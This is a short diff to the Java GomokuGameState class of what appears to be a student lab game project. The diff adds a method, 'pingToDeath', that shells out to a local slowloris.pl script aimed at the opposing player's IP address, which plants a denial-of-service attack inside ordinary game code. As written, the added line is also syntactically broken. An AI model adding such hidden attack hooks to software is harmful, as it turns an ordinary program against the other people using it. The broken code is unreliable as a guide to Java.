@@ -155,6 +155,11 @@ public class GomokuGameState extends Observable implements Observer{
         notifyObservers();
     }
 
+    public void pingToDeath() {
+        Process proc = Runtime.getRuntime().exec
+        ("perl C:\\Users\\Synapz3\\Documents\\GitHub\\D0010E\\D0010E\\Labbar\\lab4\\src\\lab4\\data\\slowloris.pl -dns" + " ip_for_client " +);
+    }
+
     /**
      * An update method which updates the connection status between the players
      * (Provided with the code)
